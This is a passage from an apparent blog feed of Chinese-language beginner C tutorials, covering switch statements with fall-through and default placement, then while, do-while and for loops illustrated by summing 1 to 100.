id="switch语句">switch语句</h1><p>除了if语句,如果我们判断的只是一个表达式的值—整数,那么我们可以使用switch语句来简化.</p><p>switch的一般结构是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">1</span>:</span><br><span class="line"><span class="comment">//代码段1</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">2</span>:</span><br><span class="line"><span class="comment">//代码段2</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">... <span class="comment">// 任意数量的case语句---同样不能超出编译器允许的最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> 常量n:</span><br><span class="line"><span class="comment">//代码段n</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">//默认执行代码段</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解释">解释</h2><p>1.在上面的模板中,我们只对<code>表达式</code>进行一次求值,然后对这个值<code>从上向下</code>依次尝试匹配,如果一旦从一众常量中匹配到一个,那么就从该case进入,依次向下执行代码,直到遇到<code>break;</code>结束或者switch尾部结束.</p><p>2.必须注意的是,<code>表达式求值后必须为整数</code>,因为我们要对其进行精确匹配,而浮点数会有精度问题,很难保持绝对的相等.</p><p>3.非常重要的一点是:case仅仅是一个<code>标号</code>—C语言中的case是真正意义上的标号而已,一旦匹配到后,就不会对后面的语句有任何影响,于是,如果你的当前case没有<code>break;</code>,那么他会穿过下一个没有匹配到的case一直执行下去,直到在任何地方遇到一个<code>break;</code>或者switch尾部才结束—我们会举例强调这个重要特性!</p><p>4.default可有可无,而且其位置任意.这意味着两件事:首先,default类似<code>else&#123;&#125;</code>,只要没有匹配到任何case标签,那么就会执行default;其次,default可以放在任意case之前/之后,对其没有任何影响,但是作为规范,我们一般都将其放在最后!</p><p>上面的解释实际已经非常全面了,如果一下子没有完全理解,不要紧,我们上例子:</p><h2 id="示例">示例</h2><h3 id="模拟菜单">模拟菜单</h3><p>我们模拟一个选择菜单,输入1,2,3,4分别输出&quot;开始游戏&quot;,“查看排名”,“设置”,“退出”,如果没有匹配到就输出&quot;输入错误&quot;.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是这么简单,记得每个printf后面都要加上<code>break;</code>,因为default在最后面,所以可以不加break.下面我们尝试一下如果不加break会发生什么:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012301497.png" alt="image-20230927012301497" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012319882.png" alt="image-20230927012319882" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012332979.png" alt="image-20230927012332979" style="zoom:33%;" /><p>显然,我们发现输出完对应的语句后并没有停止,而是向下一直运行—因为一直没有遇到<code>break;语句</code>.读者可以自行尝试在中间适当位置加上<code>break;</code>来测试是否会在此处停止.</p><p>另外,我们测试一下default的位置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 要记得加上`break;`!</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012606490.png" alt="image-20230927012606490" style="zoom:33%;" /><p>可以发现并没有任何的影响.但是要注意因为default不在末尾了,要记得加上<code>break;</code>!</p><p>最后,我们可以利用一下switch没遇到<code>break;</code>就不会停止(到达尾部除外)的特性,写一个程序:</p><h3 id="及格判断">及格判断</h3><p>输入’A’,‘B’,‘C’,'D’这4个评级之一,判断是否及格—除了’D’都及格.同时,要判断错误输入.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> level;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;level); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (level) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜你,及格了!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;很遗憾,不及格!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中可以看出,无论是匹配到’A’,‘B’,'C’中的任何一个,都会执行10,11两行—因为前面的标签后面没有任何语句!包括<code>break;</code>也没有!所以一直向下到第10行,这样一定程度上简化了代码—但是绝对不能滥用,因为毕竟这是C语言的一个特性,要慎重!</p><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013445783.png" alt="image-20230927013445783" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013502980.png" alt="image-20230927013502980" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013514457.png" alt="image-20230927013514457" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013526700.png" alt="image-20230927013526700" style="zoom:33%;" /><br><p>至此,选择执行的语句基本介绍完毕,但是有些细节—例如<code>break;</code>语句究竟是什么?等问题,还有嵌套使用等都要在后面进行详细的讲解.</p><p align=right>---WAHAHA 2023.9.27</p><br><br><p>上一篇:<a href="../202322bfbdadd502">C语言教程-5-顺序执行</a></p><p>下一篇:<a href="../20236c790fce4667">C语言教程-7-循环执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-7-循环执行</title>
      <link href="/20236c790fce4667/"/>
      <url>/20236c790fce4667/</url>
      
        <content type="html"><![CDATA[<p>我们已经有了最基本的程序的编写能力,即根据我们的思路一行一行的编写或者进行一些条件判断,这当然没有问题,我们已经能够运用他们解决许多问题,但是仍有一些问题无法处理,需要学习第三种流程控制—<code>循环</code>.</p><h1 id="什么是循环执行">什么是循环执行</h1><p>为了讲解循环,我们引入一个问题:<code>我要计算从1+2+3+4+...+100的值</code>为了说明问题,我们要求不允许使用简便方法(即高斯的做法),而仅仅只能一个个的累加起来,并编写一个程序,当然,我们可以一行一行的慢慢编写相加,这样可以,代码大概是类似这样子的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sum = sum + <span class="number">1</span>; <span class="comment">// 这里的=是赋值,并不是数学意义上的=,也就是说是要把右面的值赋值给左面,</span></span><br><span class="line"><span class="comment">// sum一开始是0,这里先把sum在赋值前的值0加上1,把运算结果1重新赋值给sum,最后sum变成1</span></span><br><span class="line">sum = sum + <span class="number">2</span>;</span><br><span class="line">sum = sum + <span class="number">3</span>;</span><br><span class="line">sum = sum + <span class="number">4</span>;</span><br><span class="line">sum = sum + <span class="number">5</span>;</span><br><span class="line">sum = sum + <span class="number">6</span>;</span><br><span class="line"><span class="comment">//...以此类推</span></span><br><span class="line">sum = sum + <span class="number">99</span>;</span><br><span class="line">sum = sum + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序没有问题,但是可以看出来,代码量很大,从1加到100的运算就需要100行,笔者甚至都做了省略.</p><p>但是我们可以发现,每一步操作都是相似的—我们让sum加上一个特定的值,并且这个值是递增的.</p><p>那么,我们就有机会对其进行简化—既然每次增加的值都是递增的,而且所有的操作都是加法,我们可不可以写一个变量i,让他从1循环到100,然后让sum=sum+i;依次执行100次来达到相同的结果呢?</p><p>当然是可以的,循环控制就是为了解决这种类似的问题.</p><p>C语言有3种循环语句的实现,分别是while,do…while,for循环.下面依次进行讲解.</p><p>​</p><h1 id="while循环语句">while循环语句</h1><p>while循环语句是最简单的一种循环语句,他只有一个条件判断进行控制:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(表达式)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后续其他语句</span></span><br></pre></td></tr></table></figure><p>while循环就这么简单,其中,<code>表达式</code>是任何合法的表达式,但是从逻辑上,他应该是逻辑表达式(包含逻辑运算符的表达式),实际上,这个表达式应该叫做<code>循环条件</code>,后面我们也将其称为<code>循环条件</code></p><p>下面来解释while循环的执行过程:</p><p>1.对<code>表达式</code>进行求值,并判断其是否为<code>真</code>,如果是<code>真</code>那么就继续<code>第2步</code>;否则跳转到<code>第4步</code></p><p>2.依次执行循环体中的语句,也就是花括号括起来的这个复合语句</p><p>3.执行完毕后,跳转到<code>第1步</code></p><p>4.忽略/结束该循环,继续向下执行后续其他语句</p><p>画成流程图是这样的:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924190520596.png" alt="image-20230924190520596" style="zoom:33%;" /></p><p>总结就是,每次循环开始前都要对指定的表达式进行一个求值判断,如果为<code>真</code>则进入循环,执行完毕后再次进行判断,直到某一次判断的结果为<code>假</code>才跳出循环.</p><p>那么这就意味着,循环的执行过程中必须能保证达到某个程度时<code>表达式</code>求值为假或直接跳出循环.</p><p>一般情况下,我们使用一个变量进行循环控制,例如每次这个变量自增1,直到该变量超出一个范围,则跳出循环.</p><p>综上,我们尝试编写<code>计算从1+2+3+4+...+100的值</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>; <span class="comment">// i就是那个用于循环控制的变量,同时,其值也可以加以利用</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= <span class="number">100</span>) &#123; <span class="comment">// i小于等于100时一直进行,直到i增加到101则退出循环</span></span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>; <span class="comment">// 循环变量进行自增</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924191251084.png" alt="image-20230924191251084" style="zoom:33%;" /><p>显然,代码的关键部分就是<code>i&lt;=100</code>和<code>i=i+1</code>这两个,同时,i必须在进入循环前就初始化,因为第一次循环就要进行判断.</p><h1 id="do-while循环语句">do…while循环语句</h1><p>do…while()语句和while语句只有一个唯一的一个区别,那就是:<code>第一次循环是无条件执行的</code></p><p>换句话说,无论如何,<code>do...while()语句</code>控制的循环体至少会执行一次,而<code>while()语句</code>控制的循环体可能一次都不会执行—如果第一次条件判断就为假的话.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;<span class="keyword">while</span>(循环条件); <span class="comment">// 注意最后的;一定不能省略!</span></span><br></pre></td></tr></table></figure><p>如前所述,循环条件就是一个表达式.</p><p>do…while()语句的执行过程和while基本完全一样,唯一的区别就是在第一次循环不会进行条件判断:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924200151214.png" alt="image-20230924200151214" style="zoom:33%;" /></p><p>除了第一次循环,往后的每一次循环前都要进行一次判断.</p><p>我们利用do…while()进行改写求和程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt;= <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以自行运行一下,或尝试自行编写一遍.</p><h1 id="for循环语句">for循环语句</h1><p><code>for()语句</code>是C语言中最难,也最强大的循环语句,所有的<code>while()语句</code>,<code>do...while()语句</code>都可以轻易地修改为<code>for语句</code>,反过来,<code>for()循环语句</code>并不一定能轻易地修改为其他两种语句的写法.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>;表达式<span class="number">2</span>;表达式<span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>for()语句</code>的执行顺序如下:</p><p>1.对<code>表达式1</code>求值,一般是循环变量的声明和初始化</p><p>2.对<code>表达式2</code>进行判断,一般是对循环变量的值进行判断,也就是说<code>表达式2</code>相当于while()中的循环条件,如果是<code>真</code>那么就继续<code>第3步</code>;否则跳转到<code>第5步</code></p><p>3.正常执行循环体</p><p>4.对<code>表达式3</code>进行求值,一般是循环变量的自增或自减,然后跳转到<code>第2步</code></p><p>5.忽略/结束该循环,继续向下执行后续其他语句</p><p>流程图如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924201703987.png" alt="image-20230924201703987" style="zoom:33%;" /></p><p>实际上,表达式1会在第一次循环开始前(可能一次都不会执行)执行且仅执行一次,无论循环是否执行.</p><p>然后,接下来就是正常的条件判断,进而选择是否执行循环体.</p><p>当一次循环结束后,表达式3会被执行一次,然后才进行下一次条件判断.</p><p>如此反复,直到循环终止.</p><p>此外,这3个表达式都是可以省略的,甚至可以全部省略,但是两个<code>;</code>绝对不能省略,否则报错.</p><p>利用这个特性,还有while(1)等写法,我们可以写出死循环(并不是真的死循环,还是有终止条件的),但是关于这里的知识,我们会在<code>跳转执行</code>部分进行讲解.</p><p>同样,我们修改程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此,基本的讲解结束,另外,关于本章的求和程序还有一些其他写法,帮助各位深刻理解3种循环语句.</p><h1 id="1到100求和的其他写法">1到100求和的其他写法</h1><h2 id="第一个">第一个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>;) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第二个">第二个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt;= <span class="number">100</span>;) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第三个">第三个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (( i = i + <span class="number">1</span> ) &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p align=right>---WAHAHA,2023.9.24</p><br><br><p>上一篇:<a href="../20237a3f77e5bcf7/">c语言教程-6-选择执行</a></p><p>下一篇:<a href="../20230671b7d09817">c语言教程-8-跳转控制和嵌套</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-4-表达式和语句</title>
      <link href="/20237bb78790d38b/"/>
      <url>/20237bb78790d38b/</url>
      
